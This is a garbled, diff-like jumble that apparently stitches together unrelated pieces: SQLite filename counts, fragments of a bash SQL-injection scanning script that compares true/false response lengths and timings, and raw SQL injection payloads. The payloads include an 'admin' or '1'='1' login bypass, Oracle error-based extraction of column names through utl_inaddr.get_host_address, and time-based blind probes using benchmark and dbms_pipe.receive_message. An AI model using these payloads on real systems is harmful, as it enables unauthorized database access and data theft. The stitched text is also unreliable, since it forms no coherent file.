+1,-sqlite.sqlite3
+admin' or '1'='1'--
+echo "[ORDER BY: $colno COL REQ:$K] $request" >> ./output/$safelogname$safefilename.txt;
+4,run-623.sqlite
+if [[ $oflag == "1" ]] ; then #this routine gets run once at the begining. it stores the always false response for 	comparison.
+8,run-25.sqlite
+1,db-PORT-ZOMPARELLI.sqlite3
+' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i
+/**/
+6,token-version-1.5.sqlite
+if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then
+#replace URL encoded spaces with comments and intermediary characters
+4,run-425.sqlite
+rbuff="/*[$xcount]"
+#echo "protocol $protocol"
+4,run-555.sqlite
+') or ('x')=('x
+p) # hash + noise + newline
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=6)) AND 'i'='i
+quote="'"
+# This is because length diff testing requests are sent by the EVIL send (the following IF)
+1,pi-ager.sqlite3
+#echo "list:"
+')) or benchmark(10000000,MD5(1))#
+\n' or 1337=dbms_pipe.receive_message(1,120) --
+#echo "time of false response: $time_false"
+or 1/*
+'),(select if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+stringlength=${#uriinputdecode}
+#echo "DEBUG $uhostname"
+xp="conditionalstring"
+1,tub-bourg.sqlite3
+#if they match, grab the value of this line - its the multipart data:
+\\r\\n\\' or \\'xyz\\'=\\'xyz\\' --
